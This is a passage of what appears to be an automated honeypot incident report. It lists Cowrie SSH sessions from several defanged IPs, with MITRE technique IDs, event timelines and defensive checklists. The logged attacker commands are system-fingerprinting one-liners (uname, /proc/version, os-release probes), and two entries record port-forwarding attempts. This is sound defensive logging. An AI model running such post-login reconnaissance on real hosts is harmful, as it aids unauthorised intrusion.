| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 16:58:23` | `cowrie.session.connect` |
| `2026-07-12 16:58:23` | `cowrie.client.version` |
| `2026-07-12 16:58:23` | `cowrie.client.kex` |
| `2026-07-12 16:58:24` | `cowrie.login.success` |
| `2026-07-12 16:58:25` | `cowrie.session.params` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:25` | `cowrie.command.success` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:25` | `cowrie.command.input` |
| `2026-07-12 16:58:26` | `cowrie.log.closed` |
| `2026-07-12 16:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0deac086b0e6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 16:58 |
| **Last Seen** | 2026-07-12 16:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 16:58:35` | `cowrie.session.connect` |
| `2026-07-12 16:58:35` | `cowrie.client.version` |
| `2026-07-12 16:58:35` | `cowrie.client.kex` |
| `2026-07-12 16:58:36` | `cowrie.login.success` |
| `2026-07-12 16:58:37` | `cowrie.session.params` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.command.success` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.command.input` |
| `2026-07-12 16:58:37` | `cowrie.log.closed` |
| `2026-07-12 16:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee0f27eb028

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 16:59 |
| **Last Seen** | 2026-07-12 16:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 16:59:04` | `cowrie.session.connect` |
| `2026-07-12 16:59:04` | `cowrie.client.version` |
| `2026-07-12 16:59:04` | `cowrie.client.kex` |
| `2026-07-12 16:59:04` | `cowrie.login.success` |
| `2026-07-12 16:59:08` | `cowrie.session.params` |
| `2026-07-12 16:59:08` | `cowrie.command.input` |
| `2026-07-12 16:59:09` | `cowrie.log.closed` |
| `2026-07-12 16:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a1c747b7b8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 16:59 |
| **Last Seen** | 2026-07-12 16:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 16:59:37` | `cowrie.session.connect` |
| `2026-07-12 16:59:38` | `cowrie.client.version` |
| `2026-07-12 16:59:38` | `cowrie.client.kex` |
| `2026-07-12 16:59:40` | `cowrie.login.success` |
| `2026-07-12 16:59:41` | `cowrie.session.params` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.command.success` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.command.input` |
| `2026-07-12 16:59:41` | `cowrie.log.closed` |
| `2026-07-12 16:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-404e60be6e2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:00 |
| **Last Seen** | 2026-07-12 17:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:00:43` | `cowrie.session.connect` |
| `2026-07-12 17:00:43` | `cowrie.client.version` |
| `2026-07-12 17:00:44` | `cowrie.client.kex` |
| `2026-07-12 17:00:45` | `cowrie.login.success` |
| `2026-07-12 17:00:46` | `cowrie.session.params` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.command.success` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.command.input` |
| `2026-07-12 17:00:46` | `cowrie.log.closed` |
| `2026-07-12 17:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9db07a990f6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:01 |
| **Last Seen** | 2026-07-12 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:01:01` | `cowrie.session.connect` |
| `2026-07-12 17:01:01` | `cowrie.client.version` |
| `2026-07-12 17:01:01` | `cowrie.client.kex` |
| `2026-07-12 17:01:02` | `cowrie.login.success` |
| `2026-07-12 17:01:03` | `cowrie.session.params` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.command.success` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.command.input` |
| `2026-07-12 17:01:03` | `cowrie.log.closed` |
| `2026-07-12 17:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afdd6a29931c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:01 |
| **Last Seen** | 2026-07-12 17:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:01:26` | `cowrie.session.connect` |
| `2026-07-12 17:01:27` | `cowrie.client.version` |
| `2026-07-12 17:01:27` | `cowrie.client.kex` |
| `2026-07-12 17:01:30` | `cowrie.login.success` |
| `2026-07-12 17:01:30` | `cowrie.session.params` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:30` | `cowrie.command.success` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:30` | `cowrie.command.input` |
| `2026-07-12 17:01:31` | `cowrie.log.closed` |
| `2026-07-12 17:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71bcccec6b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:03 |
| **Last Seen** | 2026-07-12 17:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:03:05` | `cowrie.session.connect` |
| `2026-07-12 17:03:05` | `cowrie.client.version` |
| `2026-07-12 17:03:05` | `cowrie.client.kex` |
| `2026-07-12 17:03:06` | `cowrie.login.success` |
| `2026-07-12 17:03:07` | `cowrie.session.params` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:07` | `cowrie.command.success` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:07` | `cowrie.command.input` |
| `2026-07-12 17:03:08` | `cowrie.log.closed` |
| `2026-07-12 17:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc241d33ff23

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:03 |
| **Last Seen** | 2026-07-12 17:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:03:14` | `cowrie.session.connect` |
| `2026-07-12 17:03:14` | `cowrie.client.version` |
| `2026-07-12 17:03:14` | `cowrie.client.kex` |
| `2026-07-12 17:03:17` | `cowrie.login.success` |
| `2026-07-12 17:03:18` | `cowrie.session.params` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:18` | `cowrie.command.success` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:18` | `cowrie.command.input` |
| `2026-07-12 17:03:19` | `cowrie.log.closed` |
| `2026-07-12 17:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-339c25c050ce

| Field | Detail |
|---|---|
| **Source IP** | `31.173.66[.]222` |
| **First Seen** | 2026-07-12 17:03 |
| **Last Seen** | 2026-07-12 17:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:03:31` | `cowrie.session.connect` |
| `2026-07-12 17:03:31` | `cowrie.client.version` |
| `2026-07-12 17:03:31` | `cowrie.client.kex` |
| `2026-07-12 17:03:33` | `cowrie.login.success` |
| `2026-07-12 17:03:33` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.66[.]222` to AbuseIPDB if not already reported
- [ ] Block `31.173.66[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f4144afedc6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-12 17:03 |
| **Last Seen** | 2026-07-12 17:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:03:32` | `cowrie.session.connect` |
| `2026-07-12 17:03:33` | `cowrie.client.version` |
| `2026-07-12 17:03:33` | `cowrie.client.kex` |
| `2026-07-12 17:03:35` | `cowrie.login.success` |
| `2026-07-12 17:03:36` | `cowrie.session.params` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.command.success` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.command.input` |
| `2026-07-12 17:03:36` | `cowrie.log.closed` |
| `2026-07-12 17:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c057f0dfec57

| Field | Detail |
|---|---|
| **Source IP** | `80.65.90[.]155` |
| **First Seen** | 2026-07-12 17:03 |
| **Last Seen** | 2026-07-12 17:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:03:38` | `cowrie.session.connect` |
| `2026-07-12 17:03:39` | `cowrie.client.version` |
| `2026-07-12 17:03:39` | `cowrie.client.kex` |
| `2026-07-12 17:03:40` | `cowrie.login.success` |
| `2026-07-12 17:03:40` | `cowrie.direct-tcpip.request` |
| `2026-07-12 17:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.65.90[.]155` to AbuseIPDB if not already reported
- [ ] Block `80.65.90[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a2bc1db837

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-12 17:05 |
| **Last Seen** | 2026-07-12 17:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:05:14` | `cowrie.session.connect` |
| `2026-07-12 17:05:15` | `cowrie.client.version` |
| `2026-07-12 17:05:15` | `cowrie.client.kex` |
| `2026-07-12 17:05:18` | `cowrie.login.success` |
| `2026-07-12 17:05:19` | `cowrie.session.params` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:19` | `cowrie.command.success` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:19` | `cowrie.command.input` |
| `2026-07-12 17:05:20` | `cowrie.log.closed` |
| `2026-07-12 17:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55c3db161975

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 17:05 |
| **Last Seen** | 2026-07-12 17:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 17:05:26` | `cowrie.session.connect` |
| `2026-07-12 17:05:26` | `cowrie.client.version` |
| `2026-07-12 17:05:26` | `cowrie.client.kex` |
| `2026-07-12 17:05:27` | `cowrie.login.success` |
| `2026-07-12 17:05:28` | `cowrie.session.params` |
| `2026-07-12 17:05:28` | `cowrie.command.input` |
| `2026-07-12 17:05:28` | `cowrie.command.input` |
| `2026-07-12 17:05:28` | `cowrie.command.input` |
| `2026-07-12 17:05:28` | `cowrie.command.input` |
| `2026-07-12 17:05:28` | `cowrie.command.input` |
| `2026-07-12 17:05:28` | `cowrie.command.success` |
| `2026-07-12 17:05:28` | `cowrie.command.input` |
| `2026-07-12 17:05:28` | `cowrie.command.input` |
